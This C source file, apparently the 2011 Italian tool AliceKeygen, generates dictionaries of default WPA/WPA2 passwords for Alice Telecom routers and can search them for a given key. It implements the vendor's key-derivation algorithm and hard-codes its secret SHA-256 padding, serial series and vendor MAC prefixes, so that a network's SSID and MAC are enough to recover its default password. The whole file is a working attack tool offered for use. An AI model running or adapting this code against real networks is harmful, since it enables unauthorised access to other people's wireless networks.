/*
 *  AliceKeygen - Generatore wordlist per password 802.11 WPA-PSK / WPA2-PSK Alice Telecom
 *
 *  Copyright (C) 2011 Gianluca Ghettini (gianluca.ghettini@gmail.com)
 *
 *  Algoritmo AGPF originario: White Hat Crew (http://wifiresearchers.wordpress.com)
 *  Codice SHA-256 di Christophe Devine (http://www.aircrack-ng.org)
 * 
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *      
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *      
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 *  MA 02110-1301, USA.
 *
 */
 
#include"alicekeygen.h"

char usageText[] =
"\n"
"  AliceKeygen ver %d.%d - (C) 2011 Gianluca Ghettini\n"
"  Generatore wordlist per password 802.11 WPA-PSK / WPA2-PSK Alice Telecom\n" 
"\n"
"  Utilizzo: alicekeygen -s <ssid> -m <macaddr> -o <file> | -w <wpa> [opzioni]\n"
"\n"
"  Parametri:\n"
"\n"
"     -s <ssid>    : SSID della rete Alice\n"
"     -m <macaddr> : MAC address Wi-Fi del modem Alice\n"
"     -o <file>    : Nome del file dizionario di output\n"
"     -w <wpa>     : Chiave wpa da ricercare\n"
"\n"
"  Opzioni:\n"
"\n"
"     -b <mbytes>  : Alloca <mbytes> MBbytes per il buffer I/O\n"
"     -e <series>  : Utilizza solo la serie <series>\n"
"     -u           : Utilizza solo il MAC address Wi-Fi <macaddr>\n"
"     -sl <serial> : Seriale minimo (default = 0)\n"
"     -sh <serial> : Seriale massimo (default = MAX_SERIAL)\n"
"     -r <chars>   : Considera solo i primi <chars> caratteri della chiave <wpa>\n"
"\n"
"  Esempi: \"alicekeygen -s Alice-123456 -m 00:23:8E:01:02:03 -o out.txt\"\n"
"          \"alicekeygen -s Alice-123456 -m 00:23:8E:01:02:03 -w 1234abcd1234abcd1234abcd\"\n"
"\n";

unsigned long int seriesSet[] =
{
    69101,
    67901,     
    69102,
    67902,
    69103,
    67903,
    69104,
    67904,
};


unsigned char vendorMacClassSet[] =
{
    0x00, 0x22, 0x33, 0x00, 0x00, 0x00, /* Pirelli Broadband Solutions */
    0x00, 0x1D, 0x8B, 0x00, 0x00, 0x00,
    0x00, 0x13, 0xC8, 0x00, 0x00, 0x00,
    0x00, 0x17, 0xC2, 0x00, 0x00, 0x00,
    0x00, 0x19, 0xE3, 0x00, 0x00, 0x00,
    0x00, 0x1C, 0xA2, 0x00, 0x00, 0x00,
    0x00, 0x23, 0x8E, 0x00, 0x00, 0x00,
    0x00, 0x25, 0x53, 0x00, 0x00, 0x00,
    0x38, 0x22, 0x9D, 0x00, 0x00, 0x00,

    0x00, 0x0F, 0xA3, 0x00, 0x00, 0x00, /* Alpha network */
    0x00, 0x18, 0x02, 0x00, 0x00, 0x00,
    0x00, 0x1D, 0x6A, 0x00, 0x00, 0x00,
    0x5C, 0x33, 0x8E, 0x00, 0x00, 0x00,

    0x00, 0x26, 0x8D, 0x00, 0x00, 0x00, /* CellTell */
};

unsigned char charset[] =
{
    '0', '1' ,'2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
    'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3',
    '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
    'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',
    '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r',
    's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b',
    'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
    'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f',
    'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
    'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3',
    '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
    'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3'
};

unsigned char fixedPadding[32] =
{
    0x64, 0xC6, 0xDD, 0xE3, 0xE5, 0x79, 0xB6,
    0xD9, 0x86, 0x96, 0x8D, 0x34, 0x45, 0xD2,
    0x3B, 0x15, 0xCA, 0xAF, 0x12, 0x84, 0x02,
    0xAC, 0x56, 0x00, 0x05, 0xCE, 0x20, 0x75,
    0x91, 0x3F, 0xDC, 0xE8
};

/* dati globali */
struct option userOptions; /* opzioni utente */
int lastErr, res;   /* ultimo codice errore e risultato operazione */ 

/* buffers */
unsigned char seriesXserial[SERIESXSERIAL_SIZE];
unsigned char macSet[MAX_NUM_MAC][MAC_SIZE];
unsigned char macAddrWifi[MAC_SIZE];
unsigned char macAddrEth[MAC_SIZE];
unsigned char wpa[WPA_SIZE];
unsigned char hash[SHA256_SIZE];
   
/* puntatori per il buffer di scrittura */
unsigned char *bufferStartPtr;
unsigned char *bufferEndPtr;
unsigned char *bufferPtr;

sha256_context *shaCtx; /* context per sha-256 */

FILE* fileHandle; /* file di output */

/* numero totale di serie, indirizzi MAC e chiavi wpa */
unsigned long int totalNumOfSeries;
unsigned long int totalNumOfMacs;
unsigned long int totalNumOfVendorMacClasses;
unsigned long int totalCycles;

/* stato corrente di generazione delle chiavi */
unsigned long int cycle;
float poc;
unsigned long int q;
unsigned long int series;
unsigned long int serial;

unsigned long int ss, ee;

/* chiave WPA da ricercare */
unsigned char wpaTest[WPA_SIZE];

/* libera le risorse (se allocate) */
void freeMem()
{
    if(bufferStartPtr != NULL)
    {
        free(bufferStartPtr);
    }
    if(shaCtx != NULL)
    {
        free(shaCtx);
    }
    if(fileHandle > 0)
    {
        fclose(fileHandle);
    }
}

/* controlla se i primi <userOptions.wpaChars> caratteri della chiave wpa di
   test coincidono con la chiave wpa generata */
int isWpaCorrect()
{   
	int i;
	
    for(i = 0; i < userOptions.wpaChars; i++)
    {
        if(wpa[i] != wpaTest[i])
        {
            return FALSE;
        }
    }
    return TRUE;
}

/* mac0 e mac1 sono uguali? */
int isMacEqual(unsigned char *mac0, unsigned char *mac1)
{
    int i;
	
    for(i = 0; i < MAC_SIZE; i++)
    {
        if(mac0[i] != mac1[i])
        {
            return FALSE;
        }
    }
    return TRUE;
}

/* mac e' gia' presente nella lista macSet? */
int isMacPresent(unsigned char *mac)
{
    int i;
    
    for(i = 0; i < totalNumOfMacs; i++)
    {
        if(isMacEqual(mac, macSet[i]) == TRUE)
        {
            return TRUE;
        }
    }
    return FALSE;
}

/* aggiunge macAddr alla lista degli indirzzi MAC da utilizzare */
void addMacAddr(int index, unsigned char* macAddr)
{
    int i;
    
    for(i = 0; i < MAC_SIZE; i++)
    {
        macSet[index][i] = macAddr[i];
    }
}

/* stampa a video lo stato attuale di avanzamento */
void printProgress()
{
	int i;
	
    poc = ( (float)cycle / (float)totalCycles) * 100;
    if(userOptions.opMode == GENFILE)
    {
        printf("\rCreazione dizionario in corso... %2.2f%%", poc);
    }
    else if(userOptions.opMode == FINDKEY)
    {
        printf("\rRicerca chiave in corso... ");
        printf("[");
        for(i = 0; i < userOptions.wpaChars; i++) printf("%c", wpa[i]);
        for(i = userOptions.wpaChars; i < WPA_SIZE; i++) printf(".");            
        printf("] %2.2f%%", poc);
        
    }
}

/* scrive il buffer sul file di output */
int flushBuffer()
{
    unsigned long int bytesWritten;
    
    bytesWritten = fwrite(bufferStartPtr, 1, bufferPtr - bufferStartPtr, fileHandle);
    if(bytesWritten != (bufferPtr - bufferStartPtr))
    {
        return FAILURE;
    }
    bufferPtr = bufferStartPtr;
    return SUCCESS;
}

/* scrive la chiave wpa corrente sul buffer */
int writeWpaToBuffer()
{
    if((bufferEndPtr - bufferPtr) < (userOptions.wpaChars + CRLF_SIZE)) /* buffer pieno! */
    {
        if(flushBuffer() == FAILURE) /* scrivi su disco e svuota il buffer */
        {
            lastErr = FILE_ERR;
            return FAILURE;
        }
    }
    else /* c'e' ancora spazio, scrivi la chiave wpa su buffer */
    {
        memcpy(bufferPtr, wpa, userOptions.wpaChars);
        bufferPtr += userOptions.wpaChars;
        *bufferPtr++ = CR;
        *bufferPtr++ = LF;
    }
    return SUCCESS;
}

/* genera tutte le chiavi wpa possibili per ssid-series-macAddr specificati */
int generateKeys(unsigned long int ssid, unsigned long int series, unsigned char *macAddr)
{ 
	int i;
	
    for(serial = userOptions.startSerial; serial < userOptions.endSerial; serial++) /* per ogni serial... */
    {
    
    	if(cycle % PRINT_RATE == 0)
        {
            printProgress();
        }
        
        sprintf(seriesXserial, "%05dX%07d", series, serial); /* crea la stringa serie-X-seriale */
            
        /* calcola l'hash SHA256(fixedPadding + serie-X-seriale + MAC) */
        sha256_starts(shaCtx); 
        sha256_update(shaCtx, fixedPadding, sizeof(fixedPadding));
        sha256_update(shaCtx, seriesXserial, SERIESXSERIAL_SIZE);
        sha256_update(shaCtx, macAddr, MAC_SIZE);
        sha256_finish(shaCtx, hash);
            
        /* converte l'hash in caratteri ASCII */
        for(i = 0; i < WPA_SIZE; i++) wpa[i] = charset[hash[i]];

        if(userOptions.opMode == FINDKEY) /* stiamo cercando una chiave particolare */
        {
            if(isWpaCorrect() == TRUE)
            {
                return KEYFOUND;
            }
        }
        else if(userOptions.opMode == GENFILE) /* stiamo generando il dizionario */
        {
            if(writeWpaToBuffer() == FAILURE)
            {
                lastErr = FILE_ERR;
                return FAILURE;
            }
        }
        cycle++;
    }
    return SUCCESS;
}

/* calcola il MAC della scheda ethernet */
int computeMacEth012(unsigned char *macAddrEth, unsigned char *macAddrTest, unsigned long int ssid)
{
    unsigned long int ssid0, ssid1, ssid2;
    
    ssid0 = ssid;
    ssid1 = ssid + 100000000;
    ssid2 = ssid + 200000000;
    
    macAddrEth[0] = macAddrTest[0];
    macAddrEth[1] = macAddrTest[1];
    macAddrEth[2] = macAddrTest[2];
    
    if(((ssid0 & 0xF000000) >> 24) == ((macAddrTest[2] & 0xF)))
    {
        macAddrEth[3] = (ssid0 & 0xFF0000) >> 16;
        macAddrEth[4] = (ssid0 & 0x00FF00) >> 8;
        macAddrEth[5] = ssid0 & 0x0000FF;
    }

    else if(((ssid1 & 0xF000000) >> 24) == ((macAddrTest[2] & 0xF)))
    {
        macAddrEth[3] = (ssid1 & 0xFF0000) >> 16;
        macAddrEth[4] = (ssid1 & 0x00FF00) >> 8;
        macAddrEth[5] = ssid1 & 0x0000FF;
    }    

    else if(((ssid2 & 0xF000000) >> 24) == ((macAddrTest[2] & 0xF)))
    {
        macAddrEth[3] = (ssid2 & 0xFF0000) >> 16;
        macAddrEth[4] = (ssid2 & 0x00FF00) >> 8;
        macAddrEth[5] = ssid2 & 0x0000FF;
    }
    else
    {
        macAddrEth[3] = 0;
        macAddrEth[4] = 0;
        macAddrEth[5] = 0;
        return FAILURE;
    }
    return SUCCESS;
}

/* inizializza le risorse */
int initMem()
{
    bufferPtr = NULL;
    if(userOptions.opMode == GENFILE) /* generiamo il file dizionario? */
    {
        /* si, alloca il buffer di scrittura e inizializza i puntatori */
        bufferStartPtr = (unsigned char *)malloc(userOptions.bufferSize * 1048576 * sizeof(unsigned char));
        if(bufferStartPtr == NULL)
        {
            lastErr = MEM_ERR;
            return FAILURE;
        }
        bufferPtr = bufferStartPtr;
        bufferEndPtr = bufferStartPtr + (userOptions.bufferSize * 1048576 * sizeof(unsigned char));
    }
    
    /* alloca il context per SHA-256 */
    shaCtx = NULL;
    shaCtx = (sha256_context*)malloc(1 * sizeof(sha256_context));
    if(shaCtx == NULL)
    {
        lastErr = MEM_ERR;
        return FAILURE;
    }
    
    /* apre il file in scrittura */
    fileHandle = 0;
    if(userOptions.file != NULL)
    {
        fileHandle = fopen(userOptions.file, "rb");
        if(fileHandle > 0)
        {
            lastErr = FILE_EXS; /* esiste gia' un file con lo stesso nome! */
            return FAILURE;
        }
        else
        {
            fileHandle = fopen(userOptions.file, "ab");
            if(fileHandle <= 0)
            {
                lastErr = FILE_ERR; /* problema con la creazione del file */
                return FAILURE;
            }
        }          
    }
    return SUCCESS;  
}

/* inizializzazione dei parametri */
int init()
{
    cycle = 0;     

    lastErr = SUCCESS;
    poc = 0;
    q = 0;
    int i;

    /* generazione di tutti gli indirizzi MAC da utilizzare */
    totalNumOfMacs = 0;
    addMacAddr(totalNumOfMacs++, macAddrWifi);
    if(computeMacEth012(macAddrEth, macAddrWifi, userOptions.ssid) == SUCCESS)
    {
        if(!isMacPresent(macAddrEth))
        {
            addMacAddr(totalNumOfMacs++, macAddrEth);
        }
    }
    
    totalNumOfVendorMacClasses = sizeof(vendorMacClassSet) / sizeof(unsigned char) / MAC_SIZE;
    
    for(i = 0; i < totalNumOfVendorMacClasses; i++)
    {   
        if(computeMacEth012(macAddrEth, vendorMacClassSet + (i * MAC_SIZE), userOptions.ssid) == SUCCESS)
        {
            if(isMacPresent(macAddrEth) == FALSE)
            {
                addMacAddr(totalNumOfMacs++, macAddrEth);
            }      
        }
    }
    
    if(userOptions.series > 0) /* l'utente ha specificato una serie? */
    {
        /* si, considera solo la serie specificata */
        totalNumOfSeries = 1;
		seriesSet[0] = userOptions.series;
    }
    else
    {
        /* no, considerale tutte */
        totalNumOfSeries = sizeof(seriesSet) / sizeof(unsigned long int);
    }
    
    /* calcola il numero di chiavi totali da generare */
    totalCycles = 0;
    totalCycles += (userOptions.endSerial - userOptions.startSerial);
    totalCycles *= totalNumOfMacs;
    totalCycles *= totalNumOfSeries;
    
    return SUCCESS;  
}

/* inizializza le opzioni utente a valori di default */
void initOptions()
{
    userOptions.ssid = 0;
    userOptions.macAddrWifi = NULL;
    userOptions.file = NULL;
    userOptions.bufferSize = DEFAULT_BUFFER_SIZE_MB;
    userOptions.series = 0;
    userOptions.startSerial = 0;
    userOptions.endSerial = MAX_SERIAL;   
    userOptions.opMode = NONE;
    userOptions.justOneMac = FALSE;
    userOptions.wpaChars = WPA_SIZE;
}

/* converte un indirizzo MAC da stringa a byte[6] */
int str2mac(unsigned char* str, unsigned char* mac)
{
    int a[MAC_SIZE];
    int i;
    
    if(sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x", &a[5], &a[4], &a[3], &a[2], &a[1], &a[0]) != MAC_SIZE)
    {
        return FAILURE;
    }

	for(i = 0; i < MAC_SIZE; i++)
	{
		mac[i] = a[MAC_SIZE - i - 1];
	}

    return SUCCESS;
}

/* loop principale di generazione delle chiavi */
int coreLoop()
{   
    res = SUCCESS;
    
    for(ss = 0; ss < totalNumOfSeries && res == SUCCESS; ss++)
    {
        for(ee = 0; ee < totalNumOfMacs && res == SUCCESS; ee++)
        {
            res = generateKeys(userOptions.ssid, seriesSet[ss], macSet[ee]);
        }
    }
    return res;
}


int main(int argc, char *argv[])
{   
    int err = FALSE;
	int i;
	
    initOptions();
    
    /* parsing e validazione di tutti i parametri inseriti */
    for(i = 1; i < argc && err == FALSE; i++)
    {
        if(strcmp(argv[i], "-s") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: SSID non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.ssid = atoi(argv[i] + 6);
                if(userOptions.ssid <= 0 || userOptions.ssid >= 100000000)
                {
                    printf("\nErrore: SSID invalido %d", userOptions.ssid);
                    err = TRUE;                   
                }
            }
        }
        else if(strcmp(argv[i], "-m") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: MAC address non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.macAddrWifi = argv[i];
                if(strlen(userOptions.macAddrWifi) != 17 || str2mac(userOptions.macAddrWifi, macAddrWifi) == FAILURE)
                {
                    printf("\nErrore: Mac address invalido");
                    err = TRUE;                       
                }
            }
        }
        else if(strcmp(argv[i], "-o") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: file di output non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.file = argv[i];
                userOptions.opMode = GENFILE;
            }
        }
        else if(strcmp(argv[i], "-b") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: parametro b non specificato");
                err = TRUE;
            }
            else
            {
                if(atoi(argv[i]) <= 0)
                {
                    printf("\nErrore: parametro b invalido");
                    err = TRUE;
                }
                else
                {
                    userOptions.bufferSize = atoi(argv[i]);
                }
            }
        }
        else if(strcmp(argv[i], "-e") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: parametro e non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.series = atoi(argv[i]);
                if(userOptions.series <= 0 || userOptions.series >= 100000)
                {
                    printf("\nErrore: parametro e invalido");
                    err = TRUE;
                }
            }
        }
        else if(strcmp(argv[i], "-w") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: chiave WPA non specificata");
                err = TRUE;
            }
            else
            {
				strcpy(wpaTest, argv[i]);
				userOptions.opMode = FINDKEY;
            }
        }
        else if(strcmp(argv[i], "-r") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: numero di caratteri per chiave WPA non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.wpaChars = atoi(argv[i]);
                if(userOptions.wpaChars <= 0 || userOptions.wpaChars > WPA_SIZE)
                {
                    printf("\nErrore: parametro r invalido");
                    err = TRUE;
                }      
            }
        }
        else if(strcmp(argv[i], "-sl") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: seriale minimo non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.startSerial = atoi(argv[i]);
                if(userOptions.startSerial < 0 || userOptions.startSerial > MAX_SERIAL)
                {
                    printf("\nErrore: seriale minimo invalido %d", userOptions.startSerial);
                    err = TRUE;                   
                }
            }
        }        
        else if(strcmp(argv[i], "-sh") == 0)
        {
            i++;
            if(argc == i)
            {
                printf("\nErrore: seriale massimo non specificato");
                err = TRUE;
            }
            else
            {
                userOptions.endSerial = atoi(argv[i]) + 1; /* +1 perche' usiamo ovunque guardie if con i minore secco */
                if(userOptions.endSerial < 0 || userOptions.endSerial > MAX_SERIAL)
                {
                    printf("\nErrore: seriale massimo invalido %d", userOptions.endSerial);
                    err = TRUE;                   
                }
            }
        }
        else
        {
            printf("\nOpzione non valida: %s", argv[i]);
            err = TRUE;
        } 
    }
    if(argc == 1) /* nessun parametro e' stato inserito */
    {
        printf(usageText, MJR_VER, MIN_VER);
        exit(SUCCESS);
    }
	
	/* validazione input preliminare */
	if(userOptions.ssid == 0) /* manca l'SSID? */
    {
        printf("\nErrore: SSID della rete Alice non specificato");
        err = TRUE;
    }
    if(userOptions.macAddrWifi == NULL) /* manca il MAC address wifi? */
    {
        printf("\nErrore: MAC address wifi del modem Alice non specificato");
		err = TRUE;
    }
    if(userOptions.opMode == NONE) /* non e' stato specificato ne un file di output ne una chiave wpa */
    {
        printf("\nErrore: specificare o un file di output o una chiave wpa");
        err = TRUE;
    }
    if(userOptions.startSerial > userOptions.endSerial + 1)
    {
        printf("\nErrore: seriale minimo maggiore di quello massimo");
        err = TRUE;
    }
	if(strlen(wpaTest) != WPA_SIZE && strlen(wpaTest) != userOptions.wpaChars && userOptions.opMode == FINDKEY)
	{
		printf("\nErrore: lunghezza chiave WPA non valida");
		err = TRUE;                   
	}
	
    if(err == TRUE) /* sono stati inseriti parametri sbagliati */
    {
		printf("\n\n\n");
		exit(SUCCESS);
    }
    
    printf("\nSSID: Alice-%d", userOptions.ssid);
    printf("\nMAC WiFi: %s", userOptions.macAddrWifi);
    
    printf("\nInizializzazione risorse...");
    if(initMem() == FAILURE)
    {
        printf("Errore: ");
        if(lastErr == MEM_ERR) printf("Memoria insufficiente."); 
        if(lastErr == FILE_EXS) printf("File esistente.");
        if(lastErr == FILE_ERR) printf("Impossibile creare il file. Disco sola lettura o errore disco."); 
        freeMem();
        exit(FAILURE);
    }
    else
    {
        printf("Ok");
    }
    
    printf("\nInizializzazione parametri...");
    if(init() == FAILURE)
    {
        printf("Errore");
        freeMem();
        exit(FAILURE);
    }
    else
    {
        printf("Ok");
    }
    
    printf("\nSerie totali: %d", totalNumOfSeries);
    printf("\nSeriali totali: %d", userOptions.endSerial - userOptions.startSerial);
    printf("\nMAC totali: %d", totalNumOfMacs);
    printf("\nChiavi totali: %d", totalCycles);
    if(userOptions.opMode == GENFILE)
    {
        printf("\nDimensione buffer I/O: %d MB", userOptions.bufferSize); 
        printf("\nDimensione file wordlist: %2.1f MB", (float)(totalCycles * (userOptions.wpaChars + CRLF_SIZE)) / 1048576);
    }
	printf("\nSerie:");
    for(i = 0; i < totalNumOfSeries; i++)
    {
        printf("\n(%d) %06d", i, seriesSet[i]);       
    }
    printf("\nIndirizzi MAC:");
    for(i = 0; i < totalNumOfMacs; i++)
    {
        printf("\n(%d) %02X:%02X:%02X:%02X:%02X:%02X", i, macSet[i][0], macSet[i][1], macSet[i][2], macSet[i][3], macSet[i][4], macSet[i][5]);       
    }
    printf("\n");
    
    res = coreLoop(); /* genera tutte le chiavi wpa */
    
    printProgress(userOptions.opMode); /* stampa l'ultimo stato di avanzamento */
    
    if(userOptions.opMode == GENFILE)
    {
        flushBuffer();
        printf("\nGenerazione dizionario completata.");  
    }
    else if(userOptions.opMode == FINDKEY)
    {
        if(res == KEYFOUND)
        {
            printf("\n\n\nCHIAVE TROVATA! ");
            printf("[");
            for(i = 0; i < WPA_SIZE; i++) printf("%c", wpa[i]);           
            printf("]");
            printf("\nSeriale: %07d", serial);
            printf("\nSerie: %05d", seriesSet[ss - 1]);
            printf("\nMAC: %02X:%02X:%02X:%02X:%02X:%02X", macSet[ee - 1][0], macSet[ee - 1][1], macSet[ee - 1][2], macSet[ee - 1][3], macSet[ee - 1][4], macSet[ee - 1][5]); 
        }
        else
        {
            printf("\nChiave non trovata.");
        }
    }
    printf("\n");
    freeMem();
    exit(SUCCESS);
}
